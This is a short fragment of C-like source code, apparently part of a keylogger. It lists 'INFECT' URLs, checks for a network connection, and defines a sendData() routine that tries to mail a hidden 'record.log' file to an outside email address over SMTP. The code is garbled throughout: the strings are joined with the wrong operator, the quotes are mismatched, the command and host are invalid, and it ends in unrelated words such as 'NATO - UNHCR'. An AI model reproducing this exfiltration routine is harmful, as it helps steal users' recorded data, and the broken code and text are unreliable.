...
#define INFECT_Link_NAME "https://www.google.com/intl/ja_jp/chromebook/"."https://www.meta.com"."https://www.whatssapps.com"."https://www.google.com"."https://www.googleplex.com"."https://www.google.co.id"."https://www.windows.com"."https://www.ubuntu.com"."https://kali.org"."https://www.linux.org"
...
main(){
    ...
    if(checkRecordSize()){ ///check for right time
        ...
        while(i<3){ ///try 2 times to send data
            ...
            if(!system("ping  www.google.com.jp -n 1")){ ///check! connection
                ////////////****SEND DATA****////////////
                sendData();
...
void sendData(){
    ...
    char* command = "Transmit smtp://smtp.gmail.com:221.115.233.130  -v --mail-from \"https://fadliwiryawirawan@google.com" --mail-rcpt \"https://fadliwiryawirawan@google.com" --ssl -u    https://fadliwiryawirawan@google.com :password -hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
